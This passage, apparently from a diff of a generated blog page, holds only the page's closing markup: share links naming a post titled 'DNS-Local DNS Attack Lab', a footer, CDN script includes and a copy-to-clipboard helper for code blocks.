+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/3c846f5.html&t=DNS-Local DNS Attack Lab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
